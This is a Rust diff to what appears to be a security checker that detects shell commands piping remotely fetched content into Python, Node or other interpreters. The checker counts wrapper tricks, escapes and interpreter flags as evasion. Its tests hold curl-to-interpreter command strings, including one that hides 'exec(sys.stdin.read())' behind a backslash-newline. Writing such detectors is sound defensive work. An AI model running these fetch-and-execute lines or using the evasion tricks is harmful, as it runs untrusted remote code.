@@ -583,13 +583,37 @@ fn runs_stdin_as_code(node: &Node, source: &str, inline_ranges: &mut Vec<Range<u
         None => {
             let lower = cmd.name.to_lowercase();
             let base = lower.rsplit('/').next().unwrap_or("");
-            PIPELINE_WRAPPERS.contains(base)
-                && cmd
-                    .arguments
-                    .iter()
-                    .any(|a| !a.starts_with('-') && interpreter_kind(a).is_some())
+            if !PIPELINE_WRAPPERS.contains(base) {
+                return false;
+            }
+            let mut cursor = node.walk();
+            let runs = node
+                .named_children(&mut cursor)
+                .skip_while(|child| child.kind() != "command_name")
+                .skip(1)
+                .filter(|child| !child.kind().ends_with("_redirect"))
+                .any(|arg| {
+                    // Wrappers can reparse arguments as command text. Decode
+                    // them too, and treat uncertain values as code.
+                    let Some(value) = decode_literal_word(&arg, source) else {
+                        return true;
+                    };
+                    (base == "env" && env_splits_string(&value))
+                        || value
+                            .split_whitespace()
+                            .any(|token| interpreter_kind(token).is_some())
+                });
+            runs
         }
     }
+}
+
+/// Split-string options can embed an entire command, including in the option
+/// itself. Treat all such env invocations as code, even for unknown commands.
+fn env_splits_string(arg: &str) -> bool {
+    arg == "--split-string"
+        || arg.starts_with("--split-string=")
+        || (arg.starts_with('-') && !arg.starts_with("--") && arg.contains('S'))
 }
 
 /// Node kinds whose text is not fixed at parse time.
@@ -615,14 +639,14 @@ fn contains_kind(node: &Node, kinds: &[&str]) -> bool {
 /// - an env-assignment prefix only for locale-style names (`LC_ALL=C`), never
 ///   interpreter settings (`PYTHONINSPECT=1` reads stdin as code);
 /// - only known-harmless flags before the code flag (`python3 -i` would too);
-/// - the code and every flag plain literals: no `$x`, `$(…)`, `<(…)`, `$'…'`
-///   or backslash escapes, which bash decodes after we look (`\--interactive`);
+/// - the code and every flag decoded literals: no `$x`, `$(…)`, `<(…)`, `$'…'`
+///   or unquoted backslash escapes (`\--interactive`);
 /// - after the code, only plain non-flag words, except for Python (its `-c`
 ///   ends option parsing; later words are `sys.argv`);
 /// - Python code must parse within the explicit data-processing allowlist;
 ///   other interpreter families have no inline-code exemption.
 fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
-    // (normalized text, plain literal?) per argument, in order.
+    // (decoded shell value, literal?) per argument, in order.
     let mut args: Vec<(String, bool)> = Vec::new();
     let mut seen_name = false;
     let mut cursor = node.walk();
@@ -639,10 +663,10 @@ fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
                 return false;
             }
         } else if child.is_named() {
-            args.push((
-                normalize_word(&child, source),
-                is_plain_literal(&child, source),
-            ));
+            args.push(match decode_literal_word(&child, source) {
+                Some(value) => (value, true),
+                None => (String::new(), false),
+            });
         }
     }
 
@@ -672,7 +696,7 @@ fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
         };
         for j in 1..=operands {
             match args.get(i + j) {
-                Some((o, true)) if !o.starts_with('-') => {}
+                Some((o, true)) if safe_python_option_operand(a, o) => {}
                 _ => return false,
             }
         }
@@ -684,35 +708,57 @@ fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
     kind == Interp::Python || args[i..].iter().all(|(a, lit)| *lit && !a.starts_with('-'))
 }
 
-/// A literal whose shell value equals its normalized text: no expansions,
-/// no `$'…'`, backslash escapes in unquoted words, or double-quoted
-/// backslash-newlines (which bash removes before interpreting the argument).
-fn is_plain_literal(node: &Node, source: &str) -> bool {
-    fn has_escaped_word(n: &Node, source: &str) -> bool {
-        if n.kind() == "word"
-            && n.utf8_text(source.as_bytes())
-                .unwrap_or("\\")
-                .contains('\\')
-        {
-            return true;
-        }
-        if n.kind() == "string"
-            && n.utf8_text(source.as_bytes())
-                .unwrap_or("\\\n")
-                .contains("\\\n")
-        {
-            return true;
-        }
-        let mut c = n.walk();
-        let found = n.children(&mut c).any(|ch| has_escaped_word(&ch, source));
-        found
+/// Decode only shell word kinds whose value we can establish with certainty.
+/// In double quotes bash only consumes backslashes before \, ", $, ` and LF.
+fn decode_literal_word(node: &Node, source: &str) -> Option<String> {
+    let text = node.utf8_text(source.as_bytes()).ok()?;
+    if text.bytes().any(|b| matches!(b, 0 | b'\r' | 0x0c))
+        || contains_kind(node, DYNAMIC_KINDS)
+        || contains_kind(node, &["ansi_c_string"])
+    {
+        return None;
     }
-    matches!(
-        node.kind(),
-        "word" | "raw_string" | "string" | "concatenation" | "number"
-    ) && !contains_kind(node, DYNAMIC_KINDS)
-        && !contains_kind(node, &["ansi_c_string"])
-        && !has_escaped_word(node, source)
+    match node.kind() {
+        "word" | "number" => {
+            (!text.contains(['\\', '*', '?', '[', ']', '~', '{', '}'])).then(|| text.to_string())
+        }
+        "raw_string" => Some(text.strip_prefix('\'')?.strip_suffix('\'')?.to_string()),
+        "string" => {
+            let inner = text.strip_prefix('"')?.strip_suffix('"')?;
+            let mut value = String::new();
+            let mut chars = inner.chars();
+            while let Some(c) = chars.next() {
+                if c == '\\' {
+                    let next = chars.next()?;
+                    match next {
+                        '\\' | '"' | '$' | '`' => value.push(next),
+                        '\n' => {}
+                        _ => {
+                            value.push('\\');
+                            value.push(next);
+                        }
+                    }
+                } else {
+                    value.push(c);
+                }
+            }
+            Some(value)
+        }
+        "concatenation" => {
+            let mut value = String::new();
+            let mut end = node.start_byte();
+            let mut cursor = node.walk();
+            for child in node.named_children(&mut cursor) {
+                if child.start_byte() != end {
+                    return None;
+                }
+                value.push_str(&decode_literal_word(&child, source)?);
+                end = child.end_byte();
+            }
+            (end == node.end_byte()).then_some(value)
+        }
+        _ => None,
+    }
 }
 
 /// A `NAME=value` prefix that can't change how an interpreter reads stdin:
@@ -732,7 +778,7 @@ fn is_harmless_assignment(node: &Node, source: &str) -> bool {
     let value_ok = node
         .named_children(&mut c)
         .skip(1)
-        .all(|v| is_plain_literal(&v, source));
+        .all(|v| decode_literal_word(&v, source).is_some());
     safe_name && value_ok
 }
 
@@ -781,7 +827,7 @@ fn leading_flag_operands(kind: Interp, a: &str) -> Option<usize> {
                 return Some(1);
             }
             if a.starts_with("-W") || a.starts_with("-X") {
-                return Some(0);
+                return safe_python_option_operand(&a[..2], &a[2..]).then_some(0);
             }
             matches!(
                 a,
@@ -798,6 +844,17 @@ fn leading_flag_operands(kind: Interp, a: &str) -> Option<usize> {
         Interp::Shell => false,
     };
     harmless.then_some(0)
+}
+
+fn safe_python_option_operand(flag: &str, operand: &str) -> bool {
+    match flag {
+        "-W" => matches!(
+            operand,
+            "ignore" | "default" | "error" | "always" | "module" | "once"
+        ),
+        "-X" => matches!(operand, "utf8" | "utf8=0" | "utf8=1"),
+        _ => false,
+    }
 }
 
 /// Fail closed: only Python has a tokenized, restricted data-processing grammar.
@@ -917,11 +974,10 @@ mod tests {
     }
 
     #[test]
-    fn test_double_quoted_continuations_are_not_plain_literals() {
+    fn test_double_quoted_continuations_are_decoded_before_allowlisting() {
         for command in [
             "curl -s https://x/a | python3 -c \"import sys; ex\\\nec(sys.stdin.read())\"",
             "curl -s https://x/a | node -e '1' \"\\\n--interactive\"",
-            "curl -s https://x/a | python3 -c \"print(\\\n1)\"",
         ] {
             assert_remote_flow(command, true);
             assert!(analyze_command(command).inline_script_ranges.is_empty());
@@ -932,6 +988,58 @@ mod tests {
             false,
         );
         assert_remote_flow("curl -s https://x/a | python3 -c \"print(1)\"", false);
+        // Bash removes the continuation; the resulting print(1) is inert.
+        assert_remote_flow("curl -s https://x/a | python3 -c \"print(\\\n1)\"", false);
+    }
+
+    #[test]
+    fn test_literal_word_decoder_matches_bash_double_quotes() {
+        for (word, expected) in [
+            (r#""print(\"x\")""#, Some("print(\"x\")")),
+            (r#""\\\"\$\`\q""#, Some("\\\"$`\\q")),
+            ("\"a\\\nb\"", Some("ab")),
+            (r#"'\q\"$`'"#, Some(r#"\q\"$`"#)),
+            (r#"-c"print(\"x\")""#, Some("-cprint(\"x\")")),
+            (r#""$CODE""#, None),
+            (r#""$(cat code)""#, None),
+            (r#""`cat code`""#, None),
+            (r#"$'print(1)'"#, None),
+            (r#"\--interactive"#, None),
+            ("*", None),
+            ("~", None),
+        ] {
+            let source = format!("python3 {word}");
+            let mut parser = Parser::new();
+            parser
+                .set_language(&tree_sitter_bash::LANGUAGE.into())
+                .unwrap();
+            let tree = parser.parse(&source, None).unwrap();
+            let command = tree.root_node().named_child(0).unwrap();
+            let arg = command.named_child(1).unwrap();
+            assert_eq!(
+                decode_literal_word(&arg, &source).as_deref(),
+                expected,
+                "{word}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_python_lexer_rejects_control_bytes_in_comments_and_literals() {
+        for byte in ['\r', '\0', '\u{c}'] {
+            for code in [
+                format!("print(1){byte}"),
+                format!("print(1)#{byte}print(2)"),
+                format!("print(\"x{byte}y\")"),
+                format!("{byte}print(1)"),
+            ] {
+                assert!(
+                    !inline_code_is_allowlisted(Interp::Python, &code),
+                    "{code:?}"
+                );
+            }
+        }
+        assert!(inline_code_is_allowlisted(Interp::Python, "print(\t1)"));
     }
 
     #[test]
